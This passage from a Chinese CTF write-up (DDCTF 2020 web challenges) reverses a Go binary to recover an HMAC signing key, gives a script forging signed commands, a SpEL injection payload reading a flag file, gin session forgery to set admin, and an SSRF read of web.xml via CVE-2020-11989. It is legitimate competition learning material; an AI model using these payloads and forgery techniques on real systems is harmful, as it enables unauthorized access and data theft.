class="hljs-keyword">break</span>;<br>    runtime_morestack_noctxt(a1, a2);<br>  &#125;<br>  v65 = a7;<br>  v56 = a8;<br>  v72 = <span class="hljs-number">0LL</span>;<br>  v73 = <span class="hljs-number">0LL</span>;<br>  v74 = <span class="hljs-number">0LL</span>;<br>  v75 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( &amp;v53 == (__int64 (__fastcall ***)(__int64, __int64))<span class="hljs-number">-248LL</span> )<br>    LODWORD(v72) = (<span class="hljs-type">unsigned</span> __int64)&amp;v63;<br>  *(_QWORD *)&amp;v69 = <span class="hljs-number">2LL</span>;<br>  *((_QWORD *)&amp;v69 + <span class="hljs-number">1</span>) = <span class="hljs-number">2LL</span>;<br>  v68 = &amp;v72;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))&amp;unk_6A1040;<br>  v54 = (<span class="hljs-type">unsigned</span> __int64)&amp;v65;<br>  runtime_convT2E(a1, a2, a3, v8, a5);<br>  v11 = v55.m256i_i64[<span class="hljs-number">1</span>];<br>  v12 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v13 = (__int64)v68;<br>  v61 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  *v68 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v62 = v11;<br>  <span class="hljs-keyword">if</span> ( byte_963800 )<br>  &#123;<br>    v53 = (__int64 (__fastcall **)(__int64, __int64))(v13 + <span class="hljs-number">8</span>);<br>    *(_QWORD *)&amp;v54 = v11;<br>    runtime_writebarrierptr(a1, a2);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_QWORD *)(v13 + <span class="hljs-number">8</span>) = v11;<br>  &#125;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))&amp;unk_69EDC0;<br>  v54 = (<span class="hljs-type">unsigned</span> __int64)&amp;v56;<br>  runtime_convT2E(a1, a2, v9, v12, v10);<br>  v17 = v55.m256i_i64[<span class="hljs-number">1</span>];<br>  v18 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v19 = (__int64)(v68 + <span class="hljs-number">2</span>);<br>  v61 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v68[<span class="hljs-number">2</span>] = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v62 = v17;<br>  <span class="hljs-keyword">if</span> ( byte_963800 )<br>  &#123;<br>    v53 = (__int64 (__fastcall **)(__int64, __int64))(v19 + <span class="hljs-number">8</span>);<br>    *(_QWORD *)&amp;v54 = v17;<br>    runtime_writebarrierptr(a1, a2);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_QWORD *)(v19 + <span class="hljs-number">8</span>) = v17;<br>  &#125;<br>  *(_QWORD *)&amp;v54 = <span class="hljs-number">5LL</span>;<br>  *((_QWORD *)&amp;v54 + <span class="hljs-number">1</span>) = v68;<br>  *(_OWORD *)v55.m256i_i8 = v69;<br>  fmt_Sprintf(a1, a2, v14, v18, v15, v16, (__int64)<span class="hljs-string">&quot;%s|%d&quot;</span>);<br>  v53 = <span class="hljs-number">0LL</span>;<br>  v64 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">2</span>];<br>  v54 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">2</span>];<br>  runtime_stringtoslicebyte(a1, a2, v20, v55.m256i_i64[<span class="hljs-number">2</span>], v21, v22);<br>  v66 = *(_OWORD *)v55.m256i_i8;<br>  v67 = v55.m256i_i64[<span class="hljs-number">2</span>];<br>  v53 = <span class="hljs-number">0LL</span>;<br>  v58 = <span class="hljs-string">&quot;DDCTFWithYou&quot;</span>;<br>  *(_QWORD *)&amp;v54 = <span class="hljs-string">&quot;DDCTFWithYou&quot;</span>;<br>  v59 = <span class="hljs-number">12LL</span>;<br>  *((_QWORD *)&amp;v54 + <span class="hljs-number">1</span>) = <span class="hljs-number">12LL</span>;<br>  runtime_stringtoslicebyte(a1, a2, v23, (__int64)<span class="hljs-string">&quot;DDCTFWithYou&quot;</span>, v24, v25);<br>  v26 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v53 = off_827EE0;<br>  v70 = *(_OWORD *)v55.m256i_i8;<br>  v54 = *(_OWORD *)v55.m256i_i8;<br>  v71 = v55.m256i_i64[<span class="hljs-number">2</span>];<br>  v55.m256i_i64[<span class="hljs-number">0</span>] = v55.m256i_i64[<span class="hljs-number">2</span>];<br>  crypto_hmac_New(a1, a2, v26, v55.m256i_i64[<span class="hljs-number">1</span>], v27, v28);<br>  v54 = v66;<br>  v55.m256i_i64[<span class="hljs-number">0</span>] = v67;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))v55.m256i_i64[<span class="hljs-number">2</span>];<br>  v60 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">1</span>];<br>  (*(<span class="hljs-type">void</span> (__cdecl **)(__int64, __int64, __int64, __int64))(v55.m256i_i64[<span class="hljs-number">1</span>] + <span class="hljs-number">64</span>))(a1, a2, v29, v55.m256i_i64[<span class="hljs-number">1</span>]);<br>  v54 = <span class="hljs-number">0uLL</span>;<br>  v55.m256i_i64[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))*((_QWORD *)&amp;v60 + <span class="hljs-number">1</span>);<br>  (*(<span class="hljs-type">void</span> (__cdecl **)(__int64, __int64, __int64, __int64))(v60 + <span class="hljs-number">56</span>))(a1, a2, v30, v31);<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))qword_946330;<br>  v70 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">1</span>];<br>  v54 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">1</span>];<br>  v71 = v55.m256i_i64[<span class="hljs-number">3</span>];<br>  v55.m256i_i64[<span class="hljs-number">0</span>] = v55.m256i_i64[<span class="hljs-number">3</span>];<br>  encoding_base64__ptr_Encoding_EncodeToString(a1, a2, v55.m256i_i64[<span class="hljs-number">1</span>], v55.m256i_i64[<span class="hljs-number">2</span>], v32, v33);<br>  v57 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">1</span>];<br>  v65 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">1</span>];<br>  v63 = a7;<br>  v56 = a8;<br>  v76 = <span class="hljs-number">0LL</span>;<br>  v77 = <span class="hljs-number">0LL</span>;<br>  v78 = <span class="hljs-number">0LL</span>;<br>  v79 = <span class="hljs-number">0LL</span>;<br>  v80 = <span class="hljs-number">0LL</span>;<br>  v81 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( &amp;v53 == (__int64 (__fastcall ***)(__int64, __int64))<span class="hljs-number">-280LL</span> )<br>    LODWORD(v76) = v55.m256i_i32[<span class="hljs-number">4</span>];<br>  *(_QWORD *)&amp;v69 = <span class="hljs-number">3LL</span>;<br>  *((_QWORD *)&amp;v69 + <span class="hljs-number">1</span>) = <span class="hljs-number">3LL</span>;<br>  v68 = &amp;v76;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))&amp;unk_6A1040;<br>  v54 = (<span class="hljs-type">unsigned</span> __int64)&amp;v65;<br>  runtime_convT2E(a1, a2, v34, v55.m256i_i64[<span class="hljs-number">1</span>], v35);<br>  v38 = v55.m256i_i64[<span class="hljs-number">1</span>];<br>  v39 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v40 = (__int64)v68;<br>  v61 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  *v68 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v62 = v38;<br>  <span class="hljs-keyword">if</span> ( byte_963800 )<br>  &#123;<br>    v53 = (__int64 (__fastcall **)(__int64, __int64))(v40 + <span class="hljs-number">8</span>);<br>    *(_QWORD *)&amp;v54 = v38;<br>    runtime_writebarrierptr(a1, a2);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_QWORD *)(v40 + <span class="hljs-number">8</span>) = v38;<br>  &#125;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))&amp;unk_6A1040;<br>  v54 = (<span class="hljs-type">unsigned</span> __int64)&amp;v63;<br>  runtime_convT2E(a1, a2, v36, v39, v37);<br>  v43 = v55.m256i_i64[<span class="hljs-number">1</span>];<br>  v44 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v45 = (__int64)(v68 + <span class="hljs-number">2</span>);<br>  v61 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v68[<span class="hljs-number">2</span>] = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v62 = v43;<br>  <span class="hljs-keyword">if</span> ( byte_963800 )<br>  &#123;<br>    v53 = (__int64 (__fastcall **)(__int64, __int64))(v45 + <span class="hljs-number">8</span>);<br>    *(_QWORD *)&amp;v54 = v43;<br>    runtime_writebarrierptr(a1, a2);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_QWORD *)(v45 + <span class="hljs-number">8</span>) = v43;<br>  &#125;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))&amp;unk_69EDC0;<br>  v54 = (<span class="hljs-type">unsigned</span> __int64)&amp;v56;<br>  runtime_convT2E(a1, a2, v41, v44, v42);<br>  v49 = v55.m256i_i64[<span class="hljs-number">1</span>];<br>  v50 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v51 = (__int64)(v68 + <span class="hljs-number">4</span>);<br>  v61 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v68[<span class="hljs-number">4</span>] = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v62 = v49;<br>  <span class="hljs-keyword">if</span> ( byte_963800 )<br>  &#123;<br>    v53 = (__int64 (__fastcall **)(__int64, __int64))(v51 + <span class="hljs-number">8</span>);<br>    *(_QWORD *)&amp;v54 = v49;<br>    runtime_writebarrierptr(a1, a2);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_QWORD *)(v51 + <span class="hljs-number">8</span>) = v49;<br>  &#125;<br>  *(_QWORD *)&amp;v54 = <span class="hljs-number">41LL</span>;<br>  *((_QWORD *)&amp;v54 + <span class="hljs-number">1</span>) = v68;<br>  *(_OWORD *)v55.m256i_i8 = v69;<br>  <span class="hljs-keyword">return</span> log_Printf(a1, a2, v46, v50, v47, v48, (__int64)<span class="hljs-string">&quot;[+]get sign:%s, command:%s, time_stamp:%d&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到有一个很显眼的DDCTFWithYou，还有就是这个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">crypto_hmac_New(a1, a2, v26, v55.m256i_i64[<span class="hljs-number">1</span>], v27, v28);<br></code></pre></td></tr></table></figure><p>crypto_hmac_New这个一出来应该很多人都明白是啥了，先初步猜测这是我们的HmacSHA256（奇怪的是FindCrypt没识别出来），而这个DDCTFWithYou十有八九就是我们的秘钥</p><p>刚好题目还给了我们签名的格式，我们试验一下<br>得到的sign值为jI6DSECGAyzSs5t5wljIxgp8aBN4SmgzagxSvsv&#x2F;y3w&#x3D;，这是经过base64encode的，我们将其解码：<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200908180920946.png" alt="在这里插入图片描述"></p><p>然后明文加密后（记得引号）：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200908181050475.png" alt="在这里插入图片描述"></p><p>一样的，至此我们的工作结束，贴原WP的脚本：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;bytes&quot;</span><br>    <span class="hljs-string">&quot;io/ioutil&quot;</span><br>    <span class="hljs-string">&quot;net/http&quot;</span><br><br>    <span class="hljs-string">&quot;crypto/hmac&quot;</span><br>    <span class="hljs-string">&quot;crypto/sha256&quot;</span><br>    <span class="hljs-string">&quot;encoding/base64&quot;</span><br>    <span class="hljs-string">&quot;encoding/json&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br><br>    <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Param <span class="hljs-keyword">struct</span> &#123;<br>    Command   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;command&quot;`</span><br>    Signature <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;signature&quot;`</span><br>    Timestamp <span class="hljs-type">int64</span>  <span class="hljs-string">`json:&quot;timestamp&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    r := gin.Default()<br><br>    r.POST(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>        command := c.DefaultPostForm(<span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;DDCTF&quot;</span>)<br>        key := <span class="hljs-string">&quot;DDCTFWithYou&quot;</span><br><br>        timestamp := time.Now().Unix()<br>        plain := fmt.Sprintf(<span class="hljs-string">&quot;%s|%d&quot;</span>, command, timestamp)<br>        mac := hmac.New(sha256.New, []<span class="hljs-type">byte</span>(key))<br>        mac.Write([]<span class="hljs-type">byte</span>(plain))<br><br>        param := <span class="hljs-built_in">new</span>(Param)<br>        param.Command = command<br>        param.Signature = base64.StdEncoding.EncodeToString(mac.Sum(<span class="hljs-literal">nil</span>))<br>        param.Timestamp = timestamp<br>        js, _ := json.Marshal(param)<br><br>        url := <span class="hljs-string">&quot;http://117.51.136.197/server/command&quot;</span><br>        resp, err := http.Post(url, <span class="hljs-string">&quot;application/json&quot;</span>, bytes.NewBuffer(js))<br>        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>            <span class="hljs-built_in">panic</span>(err)<br>        &#125;<br>        <span class="hljs-keyword">defer</span> resp.Body.Close()<br>        body, _ := ioutil.ReadAll(resp.Body)<br>        c.String(http.StatusOK, <span class="hljs-type">string</span>(body))<br>    &#125;)<br><br>    r.Run(<span class="hljs-string">&quot;:2333&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，第二关完成。 接下来是最后一关。</p><p>最后一关是需要寻找可用payload，是spel注入，也算是SSTI的一种。</p><p>参考：<br><a href="https://www.cnblogs.com/poing/p/12837175.html">https://www.cnblogs.com/poing/p/12837175.html</a><br><a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.mi1k7ea.com/2020/01/10/SpEL表达式注入漏洞总结/</a></p><p>原WP师傅的脚本是另外起了一个端口用来测试命令，我那个找不到的脚本command是直接嵌到代码里了。这个好像更方便一些</p><p>贴原WP的Payload，当时好像测过这个payload但好像失败了。。不知道咋回事，然后就卡在这一步了</p><p>new java.util.Scanner(new java.io.File(‘&#x2F;home&#x2F;dc2-user&#x2F;flag&#x2F;flag.txt’)).next()<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907164201411.png" alt="图片来自原WP"><br>于是可以直接读flag（xmsl）</p><h1 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h1><p>这题比赛结束后5分钟做出来了。。好气啊</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907164612727.png" alt="在这里插入图片描述"></p><p>这题一开始以为是条件竞争漏洞，然后写了脚本测了半天，无果。</p><p>然后测试发现有整数溢出漏洞（这个也算是购物相关的网站中比较常出现的一个漏洞了，可惜当时一根筋测条件竞争去了，要不还能快点给后面留时间）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907164952446.png" alt="在这里插入图片描述"></p><p>执行结果：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/2020090716504424.png" alt="在这里插入图片描述"></p><p>再换掉账面上借的卡片后可以买礼物（这里注意整个过程手速要快，有时间限制）<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907165432462.png" alt="在这里插入图片描述"></p><p>这个seckey一般就是secretkey，好不好这题刚好有个session：<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907165524734.png" alt="在这里插入图片描述"></p><p>于是我们可以考虑这个seckey就是用来生成session的。</p><p>回过头来，直接访问flag，我们会得到信息<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907165636943.png" alt="在这里插入图片描述"></p><p>合理推测我们需要伪造session来通过验证拿flag<br>之前由于出现过Go了，我们考虑gin-session（没get到杜松子酒是gin，跑偏整到Flask那边去了）<br>参考：<a href="https://www.tizi365.com/archives/288.html">https://www.tizi365.com/archives/288.html</a></p><p>现在问题是我们需要伪造哪个字段呢？gin的session我做题时没找到太好的还原方法（原WP最后师傅贴了还原的方法），只能base64解密看看了。一番尝试后得到：<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907172822262.png" alt="在这里插入图片描述"></p><p>这个方法肯定是有问题的，但也能看出一些信息。这个session的方式应该是 timestamp|Go的encode数据|校验（也可能是签名啥的） 这样的方式，我们也可以看到一个bool类型的admin字段，我们的目标就是它。</p><p>贴过来代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>        <span class="hljs-comment">// 导入session包</span><br><span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span><br>       <span class="hljs-comment">// 导入session存储引擎</span><br><span class="hljs-string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><br>        <span class="hljs-comment">// 导入gin框架包</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>        <span class="hljs-comment">// 创建基于cookie的存储引擎，secret11111 参数是用于加密的密钥，这里填入我们的seckey</span><br>store := cookie.NewStore([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;secret11111&quot;</span>))<br>        <span class="hljs-comment">// 设置session中间件，参数mysession，指的是session的名字，也是cookie的名字</span><br>       <span class="hljs-comment">// store是前面创建的存储引擎，我们可以替换成其他存储引擎</span><br>r.Use(sessions.Sessions(<span class="hljs-string">&quot;mysession&quot;</span>, store))<br><br>r.GET(<span class="hljs-string">&quot;/hello&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>                <span class="hljs-comment">// 初始化session对象</span><br>session := sessions.Default(c)<br>                <br>                <span class="hljs-comment">// 通过session.Get读取session值</span><br>                <span class="hljs-comment">// session是键值对格式数据，因此需要通过key查询数据</span><br><span class="hljs-keyword">if</span> session.Get(<span class="hljs-string">&quot;hello&quot;</span>) != <span class="hljs-string">&quot;world&quot;</span> &#123;<br>                        <span class="hljs-comment">// 设置session数据</span><br>session.Set(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>)<br>                        <span class="hljs-comment">// 删除session数据</span><br>                        <span class="hljs-comment">//session.Delete(&quot;tizi365&quot;)</span><br>                        <span class="hljs-comment">// 保存session数据</span><br>session.Save()<br>                        <span class="hljs-comment">// 删除整个session</span><br>                        <span class="hljs-comment">// session.Clear()</span><br>&#125;<br>                <br>c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<span class="hljs-string">&quot;hello&quot;</span>: session.Get(<span class="hljs-string">&quot;hello&quot;</span>)&#125;)<br>&#125;)<br>r.Run(<span class="hljs-string">&quot;:8000&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>稍作改动即可</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> session.Get(<span class="hljs-string">&quot;hello&quot;</span>) != <span class="hljs-string">&quot;world&quot;</span> &#123;<br>                        <span class="hljs-comment">// 设置session数据</span><br>session.Set(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>)<br>                        <span class="hljs-comment">// 删除session数据</span><br>                        <span class="hljs-comment">//session.Delete(&quot;tizi365&quot;)</span><br>                        <span class="hljs-comment">// 保存session数据</span><br>session.Save()<br>                        <span class="hljs-comment">// 删除整个session</span><br>                        <span class="hljs-comment">// session.Clear()</span><br>&#125;<br><br>改成<br><br><span class="hljs-keyword">if</span> session.Get(<span class="hljs-string">&quot;admin&quot;</span>) != <span class="hljs-literal">true</span> &#123;<br>            session.Set(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-literal">true</span>)<br>            session.Save()<br>        &#125;<br><br>即可（记得放你得到的签名）<br></code></pre></td></tr></table></figure><p>这里是测试过后发现这样就行的，原本还在后面那块和timestamp那纠结了好久。。后来发现并不需要</p><p>拿到session</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907175340702.png" alt="在这里插入图片描述"></p><p>替换后拿flag</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907175411821.png" alt="在这里插入图片描述"></p><h1 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h1><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907193452165.png" alt="在这里插入图片描述"></p><p>考的这个：CVE-2020-11989<br>这个CVE前几天还看过，差点没反应过来。。<br>参考：<a href="https://xz.aliyun.com/t/7964">https://xz.aliyun.com/t/7964</a></p><p>但访问</p><p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/index.php">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/index.php</a></p><p>就行（但后面还是要用这个CVE绕进admin界面）</p><p>进入界面，这个莫名其妙的图片实在是太显眼了，本能地察觉有问题<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907193407253.png" alt="在这里插入图片描述"></p><p>SSRF，然后用fuzzDict中的字典跑了一下，可以读到WEB-INF&#x2F;web.xml：</p><p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/web.xml">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/web.xml</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">web-app</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span> <span class="hljs-attr">metadata-complete</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span><br>      classpath:spring-core.xml<br>    <span class="hljs-tag">&lt;/<span 